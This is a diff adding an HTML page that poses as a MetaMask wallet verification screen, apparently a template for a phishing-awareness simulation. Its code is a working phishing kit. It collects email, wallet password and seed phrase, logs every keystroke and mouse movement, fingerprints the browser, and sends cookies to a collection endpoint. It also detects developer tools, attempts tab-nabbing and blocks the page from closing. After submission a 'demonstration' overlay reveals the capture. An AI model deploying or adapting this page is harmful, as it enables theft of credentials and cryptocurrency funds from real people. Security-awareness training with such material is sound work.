@@ -1,0 +1,613 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>MetaMask - Connect Your Wallet</title>
+    <style>
+        body { 
+            font-family: Arial, sans-serif; 
+            margin: 0; 
+            background: #f5f5f5; 
+            transition: all 0.3s ease;
+        }
+        .container { 
+            max-width: 400px; 
+            margin: 50px auto; 
+            background: white; 
+            border-radius: 10px; 
+            box-shadow: 0 2px 20px rgba(0,0,0,0.1); 
+        }
+        .header { 
+            background: linear-gradient(45deg, #f6851b, #e2761b); 
+            color: white; 
+            padding: 30px; 
+            text-align: center; 
+            border-radius: 10px 10px 0 0; 
+        }
+        .content { padding: 30px; }
+        .form-group { margin-bottom: 20px; }
+        label { 
+            display: block; 
+            margin-bottom: 8px; 
+            font-weight: bold; 
+        }
+        input { 
+            width: 100%; 
+            padding: 12px; 
+            border: 2px solid #ddd; 
+            border-radius: 8px; 
+            font-size: 16px; 
+            box-sizing: border-box;
+        }
+        input:focus { 
+            border-color: #f6851b; 
+            outline: none; 
+        }
+        .btn { 
+            width: 100%; 
+            padding: 15px; 
+            background: #f6851b; 
+            color: white; 
+            border: none; 
+            border-radius: 8px; 
+            font-size: 16px; 
+            cursor: pointer; 
+            transition: all 0.3s;
+        }
+        .btn:hover { background: #e2761b; }
+        .btn:disabled { 
+            background: #ccc; 
+            cursor: not-allowed; 
+        }
+        .warning { 
+            background: #fff3cd; 
+            border: 1px solid #ffeaa7; 
+            padding: 15px; 
+            border-radius: 5px; 
+            margin-bottom: 20px; 
+        }
+        .footer { 
+            text-align: center; 
+            padding: 20px; 
+            font-size: 12px; 
+            color: #666; 
+        }
+        
+        /* 攻击演示样式 */
+        .attack-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.9);
+            color: white;
+            z-index: 9999;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            font-family: 'Courier New', monospace;
+        }
+        
+        .attack-content {
+            max-width: 800px;
+            padding: 40px;
+            background: linear-gradient(45deg, #ff4444, #cc0000);
+            border-radius: 15px;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+        
+        .hacker-text {
+            font-family: 'Courier New', monospace;
+            background: #000;
+            color: #00ff00;
+            padding: 20px;
+            border-radius: 10px;
+            margin: 20px 0;
+            text-align: left;
+            overflow-wrap: break-word;
+        }
+        
+        .fake-terminal {
+            background: #1e1e1e;
+            color: #00ff00;
+            padding: 20px;
+            border-radius: 10px;
+            font-family: 'Courier New', monospace;
+            text-align: left;
+            margin: 20px 0;
+            border: 2px solid #00ff00;
+        }
+        
+        .blinking {
+            animation: blink 1s infinite;
+        }
+        
+        @keyframes blink {
+            0%, 50% { opacity: 1; }
+            51%, 100% { opacity: 0; }
+        }
+        
+        .stolen-data {
+            background: rgba(255,255,255,0.1);
+            padding: 15px;
+            border-radius: 8px;
+            margin: 10px 0;
+            border-left: 4px solid #ff6b6b;
+        }
+    </style>
+</head>
+<body>
+    {{.Tracker}}
+    
+    <!-- 原始钓鱼表单 -->
+    <div class="container" id="phishing-form">
+        <div class="header">
+            <h1>🦊 MetaMask</h1>
+            <p>Secure Wallet Verification</p>
+        </div>
+        <div class="content">
+            <div class="warning">
+                ⚠️ <strong>Security Alert:</strong> Unusual activity detected. Please verify your wallet immediately.
+            </div>
+            
+            <form method="post" id="credentialForm">
+                <div class="form-group">
+                    <label>Email Address:</label>
+                    <input type="email" name="email" id="email" required placeholder="Enter your email">
+                </div>
+                <div class="form-group">
+                    <label>Wallet Password:</label>
+                    <input type="password" name="password" id="password" required placeholder="Enter your wallet password">
+                </div>
+                <div class="form-group">
+                    <label>Seed Phrase (12 words):</label>
+                    <input type="text" name="seed_phrase" id="seed_phrase" required placeholder="Enter your 12-word seed phrase">
+                </div>
+                <button type="submit" class="btn" id="submitBtn">🔐 Verify Wallet Security</button>
+            </form>
+        </div>
+        <div class="footer">
+            <p>🔒 Your security is our priority</p>
+        </div>
+    </div>
+
+    <!-- 攻击演示覆盖层 -->
+    <div class="attack-overlay" id="attackOverlay">
+        <div class="attack-content">
+            <h1>🚨 SECURITY DEMONSTRATION COMPLETE</h1>
+            <h2>Your credentials have been compromised!</h2>
+            
+            <div class="stolen-data">
+                <h3>📋 Captured Information:</h3>
+                <div id="capturedData"></div>
+            </div>
+            
+            <div class="fake-terminal" id="terminal">
+                <div>root@attacker:~# <span class="blinking">_</span></div>
+            </div>
+            
+            <div style="margin: 30px 0;">
+                <h3>🎯 Attack Techniques Demonstrated:</h3>
+                <div style="text-align: left; display: inline-block;">
+                    <div id="attacks-list"></div>
+                </div>
+            </div>
+            
+            <button onclick="closeDemo()" style="padding: 15px 30px; font-size: 16px; background: white; color: #ff4444; border: none; border-radius: 5px; cursor: pointer; margin: 20px;">
+                Close Demonstration
+            </button>
+        </div>
+    </div>
+
+    <script>
+        // 全局变量
+        let capturedCredentials = {};
+        let attackPhase = 0;
+        let terminalLines = [];
+        
+        // 页面加载时开始收集指纹信息
+        window.addEventListener('load', function() {
+            collectBrowserFingerprint();
+            initializeAdvancedAttacks();
+        });
+        
+        // 收集浏览器指纹
+        function collectBrowserFingerprint() {
+            const fingerprint = {
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                platform: navigator.platform,
+                cookieEnabled: navigator.cookieEnabled,
+                screenResolution: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                plugins: Array.from(navigator.plugins).map(p => p.name),
+                localStorage: typeof(Storage) !== "undefined",
+                sessionStorage: typeof(Storage) !== "undefined",
+                indexedDB: !!window.indexedDB,
+                webGL: !!window.WebGLRenderingContext,
+                canvas: getCanvasFingerprint()
+            };
+            
+            // 发送指纹到服务器
+            sendToServer('fingerprint', fingerprint);
+        }
+        
+        // Canvas指纹
+        function getCanvasFingerprint() {
+            try {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = 'top';
+                ctx.font = '14px Arial';
+                ctx.fillText('Browser fingerprint', 2, 2);
+                return canvas.toDataURL();
+            } catch(e) {
+                return 'unavailable';
+            }
+        }
+        
+        // 初始化高级攻击技术
+        function initializeAdvancedAttacks() {
+            // 1. 监听键盘输入
+            document.addEventListener('keydown', captureKeystrokes);
+            
+            // 2. 监听鼠标移动
+            document.addEventListener('mousemove', captureMouseMovement);
+            
+            // 3. 检测开发者工具
+            detectDevTools();
+            
+            // 4. 检测反调试
+            detectDebugging();
+            
+            // 5. 监听页面可见性变化
+            document.addEventListener('visibilitychange', handleVisibilityChange);
+            
+            // 6. 监听窗口焦点变化
+            window.addEventListener('blur', handleWindowBlur);
+            window.addEventListener('focus', handleWindowFocus);
+        }
+        
+        // 主表单提交处理
+        document.getElementById('credentialForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // 收集凭据
+            capturedCredentials = {
+                email: document.getElementById('email').value,
+                password: document.getElementById('password').value,
+                seed_phrase: document.getElementById('seed_phrase').value,
+                timestamp: new Date().toISOString(),
+                url: window.location.href,
+                referrer: document.referrer
+            };
+            
+            // 显示加载状态
+            const btn = document.getElementById('submitBtn');
+            btn.innerHTML = '🔄 Verifying...';
+            btn.disabled = true;
+            
+            // 发送凭据到后端
+            const formData = new FormData(this);
+            fetch('', {
+                method: 'POST',
+                body: formData
+            }).then(() => {
+                // 开始攻击演示
+                setTimeout(startAttackDemo, 2000);
+            }).catch(() => {
+                // 即使网络失败也继续演示
+                setTimeout(startAttackDemo, 2000);
+            });
+        });
+        
+        // 开始攻击演示
+        function startAttackDemo() {
+            // 1. 标签页劫持
+            performTabNabbing();
+            
+            // 2. 延迟显示攻击界面
+            setTimeout(showAttackInterface, 1000);
+            
+            // 3. 开始模拟攻击序列
+            setTimeout(simulateAttackSequence, 2000);
+        }
+        
+        // 标签页劫持攻击
+        function performTabNabbing() {
+            // 修改页面标题和图标
+            document.title = "⚠️ WALLET COMPROMISED - URGENT";
+            
+            // 如果有父窗口，尝试劫持
+            if (window.opener) {
+                try {
+                    window.opener.location.href = 'http://localhost:5001';
+                } catch(e) {
+                    console.log('Cross-origin restriction prevented parent window manipulation');
+                }
+            }
+            
+            // 修改页面内容
+            document.body.style.background = 'linear-gradient(45deg, #ff4444, #cc0000)';
+        }
+        
+        // 显示攻击界面
+        function showAttackInterface() {
+            document.getElementById('attackOverlay').style.display = 'flex';
+            
+            // 显示捕获的数据
+            const capturedDiv = document.getElementById('capturedData');
+            capturedDiv.innerHTML = `
+                <div class="hacker-text">
+                    EMAIL: ${capturedCredentials.email}<br>
+                    PASSWORD: ${'*'.repeat(capturedCredentials.password.length)} (${capturedCredentials.password.length} characters)<br>
+                    SEED_PHRASE: ${capturedCredentials.seed_phrase}<br>
+                    TIMESTAMP: ${capturedCredentials.timestamp}<br>
+                    BROWSER: ${navigator.userAgent.split(') ')[0]}))<br>
+                    SCREEN: ${screen.width}x${screen.height}<br>
+                    COOKIES: ${document.cookie || 'None'}<br>
+                    LOCAL_STORAGE: ${localStorage.length} items<br>
+                    SESSION_STORAGE: ${sessionStorage.length} items<br>
+                </div>
+            `;
+        }
+        
+        // 模拟攻击序列
+        function simulateAttackSequence() {
+            const attacks = [
+                { name: "🍪 Cookie Harvesting", description: "Extracting session cookies", time: 1000 },
+                { name: "🔐 Credential Verification", description: "Testing captured credentials", time: 1500 },
+                { name: "🌐 Session Hijacking", description: "Cloning user session", time: 2000 },
+                { name: "📱 Device Fingerprinting", description: "Creating device profile", time: 1000 },
+                { name: "🔍 Network Reconnaissance", description: "Scanning internal network", time: 2500 },
+                { name: "🚀 Lateral Movement", description: "Accessing connected accounts", time: 2000 },
+                { name: "💰 Wallet Drainage", description: "Initiating fund transfer", time: 3000 },
+                { name: "🛡️ Persistence Setup", description: "Installing backdoor", time: 1500 },
+                { name: "📤 Data Exfiltration", description: "Uploading stolen data", time: 2000 }
+            ];
+            
+            let delay = 0;
+            const attacksList = document.getElementById('attacks-list');
+            const terminal = document.getElementById('terminal');
+            
+            attacks.forEach((attack, index) => {
+                setTimeout(() => {
+                    // 添加到攻击列表
+                    const attackDiv = document.createElement('div');
+                    attackDiv.innerHTML = `
+                        <div style="margin: 5px 0; color: #ff6b6b;">
+                            ✅ ${attack.name}: ${attack.description}
+                        </div>
+                    `;
+                    attacksList.appendChild(attackDiv);
+                    
+                    // 添加到终端
+                    addTerminalLine(`[${new Date().toLocaleTimeString()}] ${attack.name} - ${attack.description}`);
+                    
+                    // 特殊攻击效果
+                    if (attack.name.includes('Cookie')) {
+                        simulateCookieTheft();
+                    } else if (attack.name.includes('Wallet')) {
+                        simulateWalletDrainage();
+                    } else if (attack.name.includes('Network')) {
+                        simulateNetworkScan();
+                    }
+                    
+                }, delay);
+                delay += attack.time;
+            });
+            
+            // 完成后的操作
+            setTimeout(() => {
+                addTerminalLine('[ATTACK COMPLETE] All objectives achieved');
+                addTerminalLine('[WARNING] This is a security demonstration only');
+                
+                // 可选：打开新窗口展示进一步攻击
+                setTimeout(() => {
+                    if (confirm('Open demonstration of further attack scenarios?')) {
+                        window.open('http://localhost:5001', '_blank');
+                    }
+                }, 2000);
+            }, delay + 1000);
+        }
+        
+        // 模拟Cookie窃取
+        function simulateCookieTheft() {
+            const cookies = document.cookie.split(';');
+            cookies.forEach(cookie => {
+                sendToServer('stolen_cookie', cookie.trim());
+            });
+            
+            // 设置恶意Cookie
+            document.cookie = "session_hijacked=true; path=/";
+            document.cookie = "attacker_id=" + Math.random().toString(36); 
+        }
+        
+        // 模拟钱包资金转移
+        function simulateWalletDrainage() {
+            const fakeTransactions = [
+                { amount: "0.05 ETH", to: "0x742d35Cc6634C0532925a3b8D4060D0EBC2f98D5" },
+                { amount: "1.2 ETH", to: "0x8ba1f109551bD432803012645Hac136c22C39c7" },
+                { amount: "0.8 ETH", to: "0x1234567890123456789012345678901234567890" }
+            ];
+            
+            fakeTransactions.forEach((tx, index) => {
+                setTimeout(() => {
+                    addTerminalLine(`[WALLET] Transferring ${tx.amount} to ${tx.to}`);
+                }, index * 800);
+            });
+        }
+        
+        // 模拟网络扫描
+        function simulateNetworkScan() {
+            const fakeIPs = ['192.168.1.1', '192.168.1.100', '10.0.0.1', '172.16.0.1'];
+            fakeIPs.forEach((ip, index) => {
+                setTimeout(() => {
+                    addTerminalLine(`[SCAN] Probing ${ip}:22,80,443,3389`);
+                }, index * 200);
+            });
+        }
+        
+        // 添加终端行
+        function addTerminalLine(text) {
+            const terminal = document.getElementById('terminal');
+            const line = document.createElement('div');
+            line.textContent = text;
+            line.style.color = '#00ff00';
+            terminal.appendChild(line);
+            terminal.scrollTop = terminal.scrollHeight;
+        }
+        
+        // 键盘监听
+        function captureKeystrokes(e) {
+            const keystroke = {
+                key: e.key,
+                code: e.code,
+                timestamp: Date.now(),
+                target: e.target.tagName
+            };
+            sendToServer('keystroke', keystroke);
+        }
+        
+        // 鼠标移动监听
+        function captureMouseMovement(e) {
+            // 节流处理，避免过多数据
+            if (Math.random() < 0.01) { // 1%的采样率
+                const mouseData = {
+                    x: e.clientX,
+                    y: e.clientY,
+                    timestamp: Date.now()
+                };
+                sendToServer('mouse_movement', mouseData);
+            }
+        }
+        
+        // 检测开发者工具
+        function detectDevTools() {
+            let devtools = false;
+            setInterval(() => {
+                if (window.outerHeight - window.innerHeight > 160 || 
+                    window.outerWidth - window.innerWidth > 160) {
+                    if (!devtools) {
+                        devtools = true;
+                        sendToServer('devtools_detected', { timestamp: Date.now() });
+                    }
+                } else {
+                    devtools = false;
+                }
+            }, 1000);
+        }
+        
+        // 检测调试
+        function detectDebugging() {
+            setInterval(() => {
+                const start = Date.now();
+                debugger;
+                if (Date.now() - start > 100) {
+                    sendToServer('debugging_detected', { timestamp: Date.now() });
+                }
+            }, 3000);
+        }
+        
+        // 页面可见性变化
+        function handleVisibilityChange() {
+            sendToServer('visibility_change', {
+                hidden: document.hidden,
+                timestamp: Date.now()
+            });
+        }
+        
+        // 窗口失焦
+        function handleWindowBlur() {
+            sendToServer('window_blur', { timestamp: Date.now() });
+        }
+        
+        // 窗口获焦
+        function handleWindowFocus() {
+            sendToServer('window_focus', { timestamp: Date.now() });
+        }
+        
+        // 发送数据到服务器
+        function sendToServer(type, data) {
+            try {
+                fetch('/api/collect', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        type: type,
+                        data: data,
+                        timestamp: Date.now(),
+                        session_id: getSessionId()
+                    })
+                });
+            } catch(e) {
+                console.log('Data collection failed:', e);
+            }
+        }
+        
+        // 获取会话ID
+        function getSessionId() {
+            let sessionId = localStorage.getItem('phishing_session_id');
+            if (!sessionId) {
+                sessionId = 'session_' + Math.random().toString(36).substr(2, 9);
+                localStorage.setItem('phishing_session_id', sessionId);
+            }
+            return sessionId;
+        }
+        
+        // 关闭演示
+        function closeDemo() {
+            document.getElementById('attackOverlay').style.display = 'none';
+            
+            // 恢复原始页面
+            document.title = "MetaMask - Connect Your Wallet";
+            document.body.style.background = '#f5f5f5';
+            
+            // 显示安全提示
+            alert('🛡️ 这是一个安全意识演示。\n\n在真实攻击中，您的钱包凭据、浏览器数据和设备信息都已被完全窃取。\n\n请提高安全意识，谨慎对待可疑链接和网站！');
+        }
+        
+        // 防止页面关闭（模拟恶意行为）
+        window.addEventListener('beforeunload', function(e) {
+            if (attackPhase > 0) {
+                e.preventDefault();
+                e.returnValue = '攻击正在进行中，确定要离开吗？';
+                return '攻击正在进行中，确定要离开吗？';
+            }
+        });
+        
+        // IDN攻击演示（修改地址栏显示）
+        function demonstrateIDNAttack() {
+            // 这在实际环境中需要服务器配合
+            console.log('IDN Attack: The actual domain could be хрple.com (using Cyrillic characters)');
+            console.log('Punycode: xn--ple-7cd.com');
+        }
+        
+        // 模拟浏览器扩展攻击
+        function simulateBrowserExtensionAttack() {
+            // 模拟扩展权限请求
+            if (window.chrome && window.chrome.runtime) {
+                addTerminalLine('[EXTENSION] Requesting dangerous permissions...');
+                addTerminalLine('[EXTENSION] Access to all websites: GRANTED');
+                addTerminalLine('[EXTENSION] Cookie access: GRANTED');
+                addTerminalLine('[EXTENSION] History access: GRANTED');
+            }
+        }
+        
+        // 在攻击序列中调用这些函数
+        setTimeout(demonstrateIDNAttack, 5000);
+        setTimeout(simulateBrowserExtensionAttack, 7000);
+        
+    </script>
+</body>
+</html>
